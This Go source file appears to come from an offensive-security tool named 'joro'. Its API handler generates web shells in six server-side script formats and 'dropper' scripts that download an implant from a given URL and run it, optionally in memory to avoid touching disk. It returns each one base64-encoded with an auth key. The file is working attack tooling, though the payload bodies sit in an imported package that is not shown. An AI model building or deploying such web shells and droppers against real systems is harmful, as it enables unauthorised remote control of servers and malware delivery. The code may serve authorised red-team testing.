package api

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"github.com/BishopFox/joro/internal/shell"
)

func (s *APIServer) handleGenerate(w http.ResponseWriter, r *http.Request) {
	var body struct {
		Format     string `json:"format"`
		Mode       string `json:"mode"`       // "webshell" (default) | "dropper"
		ImplantURL string `json:"implantUrl"` // required when mode=dropper
		BinaryName string `json:"binaryName"` // required when mode=dropper && !inMemory
		InMemory   bool   `json:"inMemory"`   // execute in memory without writing to disk
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON")
		return
	}

	format := strings.ToLower(strings.TrimSpace(body.Format))
	mode := strings.ToLower(strings.TrimSpace(body.Mode))
	if mode == "" {
		mode = "webshell"
	}

	if mode == "dropper" {
		s.handleGenerateDropper(w, format, body.ImplantURL, body.BinaryName, body.InMemory)
		return
	}

	var (
		content string
		authKey string
		err     error
		ext     string
	)

	switch format {
	case "asp":
		content, authKey, err = shell.GenerateASP()
		ext = "asp"
	case "aspx":
		content, authKey, err = shell.GenerateASPX()
		ext = "aspx"
	case "ashx":
		content, authKey, err = shell.GenerateASHX()
		ext = "ashx"
	case "php":
		content, authKey, err = shell.GeneratePHP()
		ext = "php"
	case "jsp":
		content, authKey, err = shell.GenerateJSP()
		ext = "jsp"
	case "cfm":
		content, authKey, err = shell.GenerateCFM()
		ext = "cfm"
	default:
		writeError(w, http.StatusBadRequest, fmt.Sprintf("unsupported format %q; use asp, ashx, aspx, cfm, jsp, or php", format))
		return
	}

	if err != nil {
		writeError(w, http.StatusInternalServerError, fmt.Sprintf("generating shell: %v", err))
		return
	}

	writeJSON(w, http.StatusOK, map[string]string{
		"fileName": "joro." + ext,
		"authKey":  authKey,
		"content":  base64.StdEncoding.EncodeToString([]byte(content)),
	})
}

func (s *APIServer) handleGenerateDropper(w http.ResponseWriter, format, implantURL, binaryName string, inMemory bool) {
	// Validate implant URL
	implantURL = strings.TrimSpace(implantURL)
	if implantURL == "" {
		writeError(w, http.StatusBadRequest, "implantUrl is required for dropper mode")
		return
	}
	u, err := url.Parse(implantURL)
	if err != nil || (u.Scheme != "http" && u.Scheme != "https") {
		writeError(w, http.StatusBadRequest, "implantUrl must be a valid HTTP or HTTPS URL")
		return
	}

	// Validate binary name for disk mode
	if !inMemory {
		binaryName = strings.TrimSpace(binaryName)
		if binaryName == "" {
			writeError(w, http.StatusBadRequest, "binaryName is required for on-disk dropper mode")
			return
		}
	}

	var (
		content string
		authKey string
		ext     string
	)

	switch format {
	case "php":
		content, authKey, err = shell.GenerateDropperPHP(implantURL, binaryName, inMemory)
		ext = "php"
	case "asp":
		content, authKey, err = shell.GenerateDropperASP(implantURL, binaryName, inMemory)
		ext = "asp"
	case "aspx":
		content, authKey, err = shell.GenerateDropperASPX(implantURL, binaryName, inMemory)
		ext = "aspx"
	case "ashx":
		content, authKey, err = shell.GenerateDropperASHX(implantURL, binaryName, inMemory)
		ext = "ashx"
	case "jsp":
		content, authKey, err = shell.GenerateDropperJSP(implantURL, binaryName, inMemory)
		ext = "jsp"
	case "cfm":
		content, authKey, err = shell.GenerateDropperCFM(implantURL, binaryName, inMemory)
		ext = "cfm"
	default:
		writeError(w, http.StatusBadRequest, fmt.Sprintf("unsupported format %q; use asp, ashx, aspx, cfm, jsp, or php", format))
		return
	}

	if err != nil {
		writeError(w, http.StatusInternalServerError, fmt.Sprintf("generating dropper: %v", err))
		return
	}

	writeJSON(w, http.StatusOK, map[string]string{
		"fileName": "joro-dropper." + ext,
		"authKey":  authKey,
		"content":  base64.StdEncoding.EncodeToString([]byte(content)),
	})
}
